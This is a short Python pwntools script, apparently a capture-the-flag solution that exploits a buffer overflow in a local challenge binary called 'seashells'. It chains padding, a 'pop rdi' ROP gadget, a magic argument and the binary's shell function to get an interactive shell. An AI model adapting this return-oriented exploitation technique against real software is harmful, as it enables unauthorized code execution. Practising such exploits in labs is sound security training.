#!/usr/bin/env python3

from pwn import *


def main():
	# context.log_level = 'DEBUG'

	file = './seashells'
	io = process(file)
	binary = ELF(file)
	rop = ROP(file)

	padding = b'a' * 18
	pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
	deadcafebabebeef = p64(0xDEADCAFEBABEBEEF)
	shell_function = p64(binary.symbols['shell'])

	payload = padding + pop_rdi + deadcafebabebeef + shell_function

	io.sendlineafter('Would you like a shell?', payload)
	io.interactive()


if __name__ == '__main__':
	main()
